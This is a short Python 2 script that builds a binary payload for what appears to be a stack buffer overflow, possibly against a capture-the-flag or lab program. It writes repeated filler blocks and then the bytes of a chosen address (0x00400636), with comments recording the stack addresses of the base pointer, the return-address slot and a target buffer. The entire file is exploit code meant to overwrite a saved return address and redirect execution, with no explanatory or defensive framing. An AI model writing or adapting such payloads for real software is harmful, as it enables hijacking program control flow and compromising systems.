#!/usr/bin/python

import sys

# for _ in xrange(1):
#     print 'a' * 12 + '\x01'

for _ in xrange(24):
    sys.stdout.write('e' * 12 + '\x08' + '\x00' * 3)

sys.stdout.write('\x36' + 'e' * 11 + '\x08' + '\x00' * 3)
sys.stdout.write('\x06' + 'e' * 11 + '\x08' + '\x00' * 3)
sys.stdout.write('\x40' + 'e' * 11 + '\x08' + '\x00' * 3)
sys.stdout.write('\x00' + 'e' * 11 + '\x09' + '\x00' * 3)

# print 'e' * 12 + '\x09'

ebp = 0xffffe440
ret_ip_addr = ebp + 0x4
cat_buf = 0xffffe428
# ret_ip = 0x00 40 06 36
